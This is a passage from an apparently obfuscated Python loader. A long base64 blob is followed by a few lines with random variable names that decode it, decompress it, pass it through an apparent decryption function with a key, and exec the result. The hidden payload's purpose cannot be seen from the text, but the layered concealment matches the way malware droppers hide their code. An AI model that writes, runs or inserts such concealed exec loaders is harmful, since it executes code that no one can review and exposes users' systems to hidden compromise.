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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
